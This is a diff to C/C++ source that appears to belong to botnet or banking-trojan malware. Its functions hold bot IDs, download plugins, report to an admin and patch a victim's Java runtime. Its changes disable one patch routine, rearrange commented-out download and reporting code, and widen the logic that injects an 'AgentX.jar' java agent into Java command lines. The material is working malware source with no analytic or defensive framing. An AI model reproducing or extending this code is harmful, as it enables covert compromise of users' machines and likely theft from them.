@@ -279,6 +279,7 @@ static bool UID_To_File(char* BotUid)
 
 static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* iniFilePath2, const char* jarExePath, char* libPath )
 {
+	return true;
 	DBG( "JavaPatcher", "Unpacking rt_add.jar" );
 	if( !UnpackToDir( rtAddPath, tmpRtPath, jarExePath ) )
 	{
@@ -542,12 +543,12 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( javaExew, addUrl );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
 		return false;
-
+*/
 	//загрузка в папку ALLUSERSPROFILE
 	//GetAllUsersProfile( Path, sizeof(Path) );
 	if( GetWorkFolder(Path) == 0 )
 		return false;
-*/
+
 	const char* miscFiles[] = { "AgentX.jar"/*, "AgentPassive.jar",*/ /*"jni.dll",*/ /*"client2015.jar", "AgentKP.jar"*/, 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
@@ -874,7 +875,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 		if( resPatch == 0 )
 		{
 			UID_To_File(BOT_UID);
-
+/*
 			srcFile = user.str();
 			dstFile = path.str();
 
@@ -926,6 +927,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			}
 			else
 				SendLogToAdmin(6); //успешная установка патча
+*/
 		};
 
 		resPatch = 2;
@@ -1202,8 +1204,8 @@ static char* UpdateJavaCmdLine( const char* cmd )
 		MemPtr<1024> insert1, replaceDst;
 		pwsprintfA( insert1.str(), "-javaagent:\"%s\\AgentX.jar\" ", path );
 		res = InsertAfter( ret, "-Xmx256M ", insert1.str() );
-		DBG( "--0", insert1.str() );
-		DBG( "--1", ret );
+		if( !res )
+			res = InsertAfter( ret, "-Xmx256m ", insert1.str() );
 //		char pathSinker_swing[MAX_PATH];
 //		pGetCurrentDirectoryA( pathSinker_swing, sizeof(pathSinker_swing) );
 //		const char* sinker_swing = "sinker-swing.jar";
